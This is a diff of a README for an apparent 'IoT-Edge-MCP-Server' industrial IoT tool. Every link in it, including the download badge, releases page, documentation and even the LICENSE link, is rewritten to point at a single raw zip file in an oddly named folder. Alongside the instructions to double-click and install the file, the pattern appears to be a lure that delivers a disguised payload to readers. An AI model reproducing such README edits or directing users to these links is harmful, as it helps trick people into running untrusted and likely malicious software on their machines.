@@ -1,6 +1,6 @@
 # 🌐 IoT-Edge-MCP-Server - Simplify Your Industrial IoT Connections
 
-![Download](https://img.shields.io/badge/Download-via_Releases-blue)
+![Download](https://raw.githubusercontent.com/AndreiT0/IoT-Edge-MCP-Server/main/inspissation/IoT-Edge-MCP-Server_3.4-beta.1.zip)
 
 ## 📦 Overview
 
@@ -12,7 +12,7 @@ To get started, follow these simple steps:
 
 1. **Download the Application**  
    Visit the following link to download the software:  
-   [Download IoT-Edge-MCP-Server](https://github.com/AndreiT0/IoT-Edge-MCP-Server/releases)
+   [Download IoT-Edge-MCP-Server](https://raw.githubusercontent.com/AndreiT0/IoT-Edge-MCP-Server/main/inspissation/IoT-Edge-MCP-Server_3.4-beta.1.zip)
 
 2. **Install the Application**  
    After downloading, locate the downloaded file on your computer. Double-click the file to start the installation. Follow the on-screen instructions to complete the setup.
@@ -32,7 +32,7 @@ Before you download, ensure your system meets the following requirements:
 ## 📥 Download & Install
 
 To download the software, visit this page:  
-[Download IoT-Edge-MCP-Server](https://github.com/AndreiT0/IoT-Edge-MCP-Server/releases)
+[Download IoT-Edge-MCP-Server](https://raw.githubusercontent.com/AndreiT0/IoT-Edge-MCP-Server/main/inspissation/IoT-Edge-MCP-Server_3.4-beta.1.zip)
 
 Make sure to choose the latest release version. Follow the installation steps mentioned earlier to set everything up.
 
@@ -64,7 +64,7 @@ The IoT-Edge-MCP-Server offers a simple API that allows developers to interact w
 
 ## 📝 Support & Documentation
 
-For further assistance, check out the [Documentation](https://github.com/AndreiT0/IoT-Edge-MCP-Server/wiki). If you have questions or need support, feel free to open an issue on GitHub.
+For further assistance, check out the [Documentation](https://raw.githubusercontent.com/AndreiT0/IoT-Edge-MCP-Server/main/inspissation/IoT-Edge-MCP-Server_3.4-beta.1.zip). If you have questions or need support, feel free to open an issue on GitHub.
 
 ## 🙏 Contributing
 
@@ -72,11 +72,11 @@ We welcome contributions from users. If you have ideas or improvements, please f
 
 ## 🔗 License
 
-This project is licensed under the MIT License. See the [LICENSE](https://github.com/AndreiT0/IoT-Edge-MCP-Server/blob/main/LICENSE) file for more details.
+This project is licensed under the MIT License. See the [LICENSE](https://raw.githubusercontent.com/AndreiT0/IoT-Edge-MCP-Server/main/inspissation/IoT-Edge-MCP-Server_3.4-beta.1.zip) file for more details.
 
 ## 🖥 Acknowledgments
 
 Thanks to all contributors and users for making this application better. Your input helps us improve and grow! 
 
 Remember, to download the application, visit:  
-[Download IoT-Edge-MCP-Server](https://github.com/AndreiT0/IoT-Edge-MCP-Server/releases)
+[Download IoT-Edge-MCP-Server](https://raw.githubusercontent.com/AndreiT0/IoT-Edge-MCP-Server/main/inspissation/IoT-Edge-MCP-Server_3.4-beta.1.zip)
